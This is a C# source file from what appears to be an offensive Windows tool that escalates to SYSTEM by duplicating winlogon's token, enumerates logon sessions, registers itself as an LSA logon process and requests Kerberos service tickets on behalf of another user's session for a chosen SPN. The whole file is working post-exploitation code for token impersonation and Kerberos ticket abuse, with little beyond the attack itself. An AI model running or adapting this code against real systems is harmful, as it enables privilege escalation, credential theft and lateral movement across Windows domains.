using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Collections.Generic;
using System.Linq;
using System;

namespace ImpTgsReq
{
  class Secondary {
    public static bool IsSystem()
    {
      var currentSid = WindowsIdentity.GetCurrent().User;
      return currentSid.IsWellKnown(WellKnownSidType.LocalSystemSid);
    }

    public static void FetchPrincipalIdentity(IntPtr threadToken)
    {
      // Console.WriteLine("[#] receive length of tokenInformation");
      int tokenInfLength = 0;
      bool result = false;
      try
      {
        // result = Interop.GetTokenInformation(hThreadToken, Interop.TOKEN_INFORMATION_CLASS.TokenUser,
        result = Interop.GetTokenInformation(threadToken, Interop.TOKEN_INFORMATION_CLASS.TokenUser,
            IntPtr.Zero, tokenInfLength, out tokenInfLength);
      }
      catch (InvalidOperationException) when (result == false)
      {
        string methodName = System.Reflection.MethodBase.GetCurrentMethod().Name;
        Console.WriteLine($"[-] ({methodName}) GetTokenInformation failed with error : " + Interop.GetLastError());
        Environment.Exit(1);
      }
      // Console.WriteLine($"[@] tokenInfLength = {tokenInfLength}");


      // Console.WriteLine("[#] receive tokenInformation");
      IntPtr tokenInformation = Marshal.AllocHGlobal(tokenInfLength);
      result = Interop.GetTokenInformation(threadToken, Interop.TOKEN_INFORMATION_CLASS.TokenUser, 
          tokenInformation, tokenInfLength, out tokenInfLength);

      // Console.WriteLine("[#] PtrToStructure to marshal into TOKEN_USER");
      Interop.TOKEN_USER tokenInformationStruct = (Interop.TOKEN_USER)Marshal.PtrToStructure(tokenInformation, typeof(Interop.TOKEN_USER));

      string strPrincipalSid;
      result = Interop.ConvertSidToStringSid(tokenInformationStruct.User.Sid, out strPrincipalSid);
      Console.WriteLine($"[!] impersonated principal Sid : {strPrincipalSid}");
      Marshal.FreeHGlobal(tokenInformation);

      UInt32 cchName = 0;
      UInt32 cchReferencedDomainName = 0;
      var sidType = Interop.SID_NAME_USE.SidTypeUnknown;
      // receiving cchName and cchReferencedDomainName (name size, domain size)
      string strAccountName = new SecurityIdentifier(strPrincipalSid).Translate(typeof(NTAccount)).ToString();
      // string strReferencedDomainName = new SecurityIdentifier(strPrincipalSid).Translate(typeof(AppDomain)).ToString();
      // Interop.LookupAccountSid(null, tokenInformationStruct.User.Sid, IntPtr.Zero, ref cchName, IntPtr.Zero, ref cchReferencedDomainName, out sidType);
      //
      // IntPtr pAccountName = Marshal.AllocHGlobal((int)cchName * sizeof(Char));
      // IntPtr pReferencedDomainName = Marshal.AllocHGlobal((int)cchReferencedDomainName * sizeof(Char));
      // Interop.LookupAccountSid(null, tokenInformationStruct.User.Sid, pAccountName, ref cchName, pReferencedDomainName, ref cchReferencedDomainName, out sidType);
      //
      // string strAccountName = Marshal.PtrToStringAuto(pAccountName);
      // string strReferencedDomainName = Marshal.PtrToStringAuto(pReferencedDomainName);

      // Console.WriteLine($"[!] AccountName : {strAccountName}, DomainName : {strReferencedDomainName}");
      Console.WriteLine($"[!] principalName : {strAccountName}");
    }

    public static bool EnableTokenPrivilege(string privName, IntPtr token, bool show)
    {
      // LookupPrivilegeValue, AdjustTokenPrivileges
      // Console.WriteLine("Looking for privilege LUID");
      var privLuid = new Interop.LUID();
      bool result = false;
      result = Interop.LookupPrivilegeValue(null, privName, ref privLuid);

      try
      {
        var tokenPrivileges = new Interop.TOKEN_PRIVILEGES();
        tokenPrivileges.PrivilegeCount = 1;
        tokenPrivileges.Privileges.Luid = privLuid;
        tokenPrivileges.Privileges.Attributes = Interop.TOKEN_PRIVILEGES_ATTRIBUTES.SE_PRIVILEGE_ENABLED;
        result = Interop.AdjustTokenPrivileges(token, false, ref tokenPrivileges, 0, IntPtr.Zero, IntPtr.Zero);
      }
      catch
      {
        string methodName = System.Reflection.MethodBase.GetCurrentMethod().Name;
        Console.WriteLine($"[-] ({methodName}) Enabling privilege failed with error : " + Interop.GetLastError());
        return false;
        Environment.Exit(1);
      }
      return true;
    }

    public static List<Interop.LUID> EnumerateLogonSessions(bool print)
    {
      // returns a List of LUIDs representing current logon sessions
      var luids = new List<Interop.LUID>();

      var returnValue = Interop.LsaEnumerateLogonSessions(out var count, out var luidPtr);

      if (returnValue != 0)
      {
        throw new System.ComponentModel.Win32Exception(Convert.ToInt32(returnValue));
      }

      for (ulong i = 0; i < count; i++)
      {
        var luid = (Interop.LUID)Marshal.PtrToStructure(luidPtr, typeof(Interop.LUID));
        luids.Add(luid);
        luidPtr = (IntPtr)(luidPtr.ToInt64() + Marshal.SizeOf(typeof(Interop.LUID)));
      }
      Interop.LsaFreeReturnBuffer(luidPtr);

      if (print == true)
      {
        foreach (var luid in luids)
        {
          var logonSessionData = Helpers.GetLogonSessionData(luid);
          Console.WriteLine($"SESSION : {logonSessionData.LogonDomain}\\{logonSessionData.Username} SESSION_LUID={logonSessionData.LogonID.LowPart}");
        }
      }

      return luids;
    }

    public static void ImpersonateSystem()
    {
      // Console.WriteLine("[#] Start application");
      IntPtr hThreadToken = IntPtr.Zero;

      // Console.WriteLine("[#] assign a parent process' token to thread and let it impersonate it in local machine context");
      Interop.ImpersonateSelf(Interop.SECURITY_IMPERSONATION_LEVEL.SecurityDelegation);
      // IntPtr hProc = Interop.GetCurrentProcess();
      IntPtr hThread = Interop.GetCurrentThread();
      // Interop.OpenThreadToken(Interop.GetCurrentThread(), Constants.TOKEN_IMPERSONATE, 
      //     false, out hThreadToken);
      bool returnValue;
      returnValue = Interop.OpenThreadToken(hThread, Interop.TOKEN_ACCESS_RIGHTS.TOKEN_ADJUST_PRIVILEGES | Interop.TOKEN_ACCESS_RIGHTS.TOKEN_QUERY, false, out hThreadToken);

      // nint hToken = WindowsIdentity.GetCurrent().Token;
      bool result = false;
      result = EnableTokenPrivilege("SE_DEBUG_NAME", hThreadToken, true);
      result = EnableTokenPrivilege("SE_IMPERSONATE_NAME", hThreadToken, true);

      System.Diagnostics.Process[] processes = System.Diagnostics.Process.GetProcessesByName("winlogon");
      IntPtr hProcess = processes[0].Handle;
      IntPtr hToken = IntPtr.Zero;
      returnValue = Interop.OpenProcessToken(hProcess, Interop.TOKEN_ACCESS_RIGHTS.TOKEN_DUPLICATE, out hToken);
      if (!returnValue)
      {
        string methodName = System.Reflection.MethodBase.GetCurrentMethod().Name;
        string syscall = "OpenProcessToken";
        throw new ApplicationException(string.Format($"[-] ({methodName}) {syscall} failed with win32 error code : ", Marshal.GetLastWin32Error()));
        Environment.Exit(1);
      }
      IntPtr hDuplicateToken = IntPtr.Zero;

      returnValue = Interop.DuplicateToken(hToken, 2, ref hDuplicateToken);
      if (!returnValue)
      {
        string methodName = System.Reflection.MethodBase.GetCurrentMethod().Name;
        string syscall = "DuplicateToken";
        throw new ApplicationException(string.Format($"[-] ({methodName}) {syscall} failed with win32 errorcode : ", Marshal.GetLastWin32Error()));
        Environment.Exit(1);
      }

      returnValue = Interop.ImpersonateLoggedOnUser(hDuplicateToken);
      if (!returnValue)
      {
        string methodName = System.Reflection.MethodBase.GetCurrentMethod().Name;
        string syscall = "ImpersonateLoggedOnUser";
        throw new ApplicationException(string.Format($"[-] ({methodName}) {syscall} failed with win32 errorcode : ", Marshal.GetLastWin32Error()));
        Environment.Exit(1);
      }

      Interop.CloseHandle(hDuplicateToken);
      Interop.CloseHandle(hToken);

      returnValue = Interop.OpenThreadToken(hThread, Interop.TOKEN_ACCESS_RIGHTS.TOKEN_QUERY, false, out hThreadToken);
      FetchPrincipalIdentity(hThreadToken);
    }


    public static void ImpTgsReq(uint sessionLuid, string targetSpn) 
    {
      // // test implant
      // System.IO.File.Create(@"C:\Users\Administrator\smth.txt");

      ImpersonateSystem();
      List<Interop.LUID> luidList;
      luidList = EnumerateLogonSessions(false);
      Interop.LUID targetSession = luidList.Where(x => x.LowPart == sessionLuid).Single();

      // Register process as a logon process
      ulong securityMode;
      IntPtr lsaHandle;
      var lsaString = new Interop.LSA_STRING();
      string name = "krb";
      lsaString.Length = (ushort)name.Length;
      lsaString.MaximumLength = (ushort)(name.Length + 1);
      lsaString.Buffer = name;

      Interop.LsaRegisterLogonProcess(lsaString, out lsaHandle, out securityMode);

      int authcPackageId;
      string authcPackageName = "kerberos";
      Interop.LSA_STRING authcPackageLsaString;
      lsaString.Length = (ushort)authcPackageName.Length;
      lsaString.MaximumLength = (ushort)(authcPackageName.Length + 1);
      lsaString.Buffer = authcPackageName;
      Interop.LsaLookupAuthenticationPackage(lsaHandle, ref lsaString, out authcPackageId);

      Helpers.InvokeTgsReq(lsaHandle, authcPackageId, targetSpn, targetSession);
      // LsaDeregisterLogonProcess()
    }
  }
}
